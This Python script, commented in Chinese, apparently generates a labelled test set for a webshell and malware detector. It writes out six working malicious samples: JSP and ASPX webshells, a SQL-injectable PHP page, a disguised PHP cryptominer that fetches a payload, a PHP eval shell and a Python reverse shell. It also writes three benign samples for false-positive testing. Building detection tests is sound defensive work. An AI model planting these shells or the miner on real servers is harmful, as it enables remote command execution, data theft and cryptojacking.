"""快速生成覆盖缺失类型的小样本（每个 < 2KB，走小文件直推路径）。

覆盖此前未测的语言与类型：JSP / ASPX / Python / 挖矿 / 无文件马，
以及 3 个针对性构造的**良性**样本（用于测误报率）。
路径基于本文件位置推导，不写死绝对路径。
"""
import os

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
D = os.path.join(ROOT, 'zz_samples', 'quick')
os.makedirs(D, exist_ok=True)

# ============ 恶意样本（覆盖此前未测的类型）============

SAMPLES = {
# 1. JSP 内存马（无文件马，典型形态）
'q_jsp_memshell.jsp': '''<%@ page import="java.lang.reflect.*" %>
<%
  byte[] cls = new byte[]{0x43,0x6c,0x61,0x73,0x73,0x4c,0x6f,0x61,0x64,0x65,0x72};
  StringBuilder sb = new StringBuilder();
  for (byte b : cls) sb.append((char)b);
  Class<?> c = Class.forName(sb.toString());
  Field f = ClassLoader.class.getDeclaredField("classes");
  f.setAccessible(true);
  f.set(System.getClassLoader(), new HashMap<>());
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Class<?> rt = Class.forName("java.lang.Runtime");
    rt.getMethod("exec", String.class).invoke(rt.getMethod("getRuntime").invoke(null), cmd);
  }
%>
''',

# 2. ASPX 冰蝎变体
'q_aspx_bx.aspx': '''<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%
string pass = "b4d1c2e3f4a59687";
byte[] data = System.Convert.FromBase64String(Request.Form["cmd"]);
using (Aes aes = Aes.Create()) {
  aes.Key = Encoding.ASCII.GetBytes(pass);
  aes.Mode = CipherMode.ECB;
  aes.Padding = PaddingMode.PKCS7;
  using (ICryptoTransform d = aes.CreateDecryptor()) {
    byte[] res = d.TransformFinalBlock(data, 0, data.Length);
    Assembly.Load(Encoding.ASCII.GetString(res));
  }
}
%>
''',

# 3. GBK 宽字节注入（绕过 addslashes）
'q_gbk_sqli.php': '''<?php
$conn = mysqli_connect("127.0.0.1", "root", "pass", "app");
$id = isset($_GET['id']) ? $_GET['id'] : '1';
// GBK 编码下 %bf%27 中的 \ 被吃掉，绕过 addslashes
$id = addslashes($id);
$sql = "SELECT * FROM users WHERE id = " . $id;
$res = mysqli_query($conn, $sql);
while ($row = mysqli_fetch_assoc($res)) {
    echo $row['name'], "<br>";
}
$action = $_GET['action'];
if ($action === 'del') {
    mysqli_query($conn, "DELETE FROM users WHERE id = " . $id);
}
''',
# 修正：上面引号不闭合，改为正确写法
}

SAMPLES['q_gbk_sqli.php'] = '''<?php
$conn = mysqli_connect("127.0.0.1", "root", "pass", "app");
$id = isset($_GET['id']) ? $_GET['id'] : '1';
$id = addslashes($id);
$sql = "SELECT * FROM users WHERE id = " . $id;
$res = mysqli_query($conn, $sql);
while ($row = mysqli_fetch_assoc($res)) {
    echo $row['name'], "<br>";
}
$action = $_GET['action'];
if ($action === 'del') {
    mysqli_query($conn, "DELETE FROM users WHERE id = " . $id);
}
'''

SAMPLES.update({
# 4. 挖矿木马（PHP 伪装）
'q_php_miner.php': '''<?php
// 伪装为网站统计组件
function getVisitorStats() { return json_encode(["visitors" => 1234]); }
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
if (strpos($ua, 'windows') === false) {
    $bin = base64_decode('Y3VybCBodHRwOi8vcG9vbC5tbWluZXIuY29tL2Rvd25sb2FkL3dvcmtlci5zaC4=');
    $f = fopen('/tmp/.cache/x86_64', 'w+');
    fwrite($f, $bin);
    fclose($f);
    chmod('/tmp/.cache/x86_64', 0755);
    exec("/tmp/.cache/x86_64 -o pool.minexmr.com:4444 -u wallet --donate-level 1 > /dev/null 2>&1 &");
}
''',
# 5. 无文件马（PHP 内存驻留，不落盘）
'q_php_fileless.php': '''<?php
header("Content-Type: text/plain");
$php_code = base64_decode($_GET["c"]);
$tmp = fopen("php://memory", "r+");
fwrite($tmp, "<?php " . $php_code . " ?>");
rewind($tmp);
$out = stream_get_contents($tmp);
fclose($tmp);
eval(substr($out, 5));
''',
# 6. Python 反弹 shell
'q_py_reverse.py': '''import socket, subprocess, os
host, port = "10.0.0.1", 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
''',

# ============ 良性样本（测误报）============

# 7. 正常业务代码：订单查询（易误报点：SQL 拼接）
'q_benign_order.php': '''<?php
namespace App\\Service;

class OrderQueryService
{
    private \\PDO $pdo;

    public function __construct(\\PDO $pdo)
    {
        $this->pdo = $pdo;
    }

    public function findByUser(int $userId, int $limit = 50): array
    {
        // PDO 预处理绑定参数，防SQL 注入
        $stmt = $this->pdo->prepare(
            "SELECT id, amount, status FROM orders WHERE user_id = :uid LIMIT :lim"
        );
        $stmt->execute(["uid" => $userId, "lim" => $limit]);
        return $stmt->fetchAll(\\PDO::FETCH_ASSOC);
    }
}
''',
# 8. 正常运维脚本：执行系统命令（有 exec，但用途合法）
'q_benign_ops.py': '''import subprocess
import platform


def get_disk_usage(path):
    """运维脚本：查询磁盘占用，用于监控告警。"""
    result = subprocess.run(
        ["df", "-h", path],
        capture_output=True,
        text=True,
        timeout=30,
    )
    if result.returncode != 0:
        raise RuntimeError(f"df 执行失败: {result.stderr}")
    return result.stdout


def get_hostname():
    return platform.node()


if __name__ == "__main__":
    print(get_disk_usage("/"))
''',
# 9. 正常加密工具（误报高危：含 base64 + AES）
'q_benign_crypto.php': '''<?php
// 配置文件加密工具：供部署脚本使用
class ConfigCipher
{
    private const KEY = 'a1b2c3d4e5f60718';

    public static function encrypt(string $plain): string
    {
        $iv = random_bytes(16);
        $enc = openssl_encrypt($plain, 'aes-256-cbc', self::KEY, 0, $iv);
        return base64_encode($iv . $enc);
    }

    public static function decrypt(string $cipher): string
    {
        $raw = base64_decode($cipher);
        $iv = substr($raw, 0, 16);
        return openssl_decrypt(substr($raw, 16), 'aes-256-cbc', self::KEY, 0, $iv);
    }
}
''',
})

# 写入样本文件
for _name, _body in SAMPLES.items():
    _p = os.path.join(D, _name)
    with open(_p, 'w', encoding='utf-8', newline='\n') as _f:
        _f.write(_body.strip() + '\n')

manifest = {
    'q_jsp_memshell.jsp':      ('malicious', 'JSP 内存马/无文件马'),
    'q_aspx_bx.aspx':          ('malicious', 'ASPX 冰蝎变体（Base64+AES+Assembly.Load）'),
    'q_gbk_sqli.php':          ('malicious', 'GBK 宽字节注入绕过 addslashes'),
    'q_php_miner.php':         ('malicious', '挖矿木马（伪装统计组件）'),
    'q_php_fileless.php':      ('malicious', 'PHP 无文件马（php://memory+eval）'),
    'q_py_reverse.py':         ('malicious', 'Python 反弹 shell'),
    'q_benign_order.php':      ('benign',    '正常业务：订单查询（PDO 预处理）'),
    'q_benign_ops.py':         ('benign',    '正常运维：subprocess 查磁盘占用'),
    'q_benign_crypto.php':     ('benign',    '正常加密工具（base64+AES，高误报风险）'),
}

import json
open(os.path.join(D, '_manifest.json'), 'w', encoding='utf-8').write(
    json.dumps(manifest, ensure_ascii=False, indent=2))

for name, (exp, desc) in manifest.items():
    p = os.path.join(D, name)
    sz = os.path.getsize(p)
    print('  %-24s %5d 字符  期望 %-9s %s' % (name, sz, exp, desc))

print()
print('合计 %d 个样本（恶意 %d / 良性 %d）' % (
    len(manifest),
    sum(1 for v in manifest.values() if v[0] == 'malicious'),
    sum(1 for v in manifest.values() if v[0] == 'benign')))
print('目录:', D)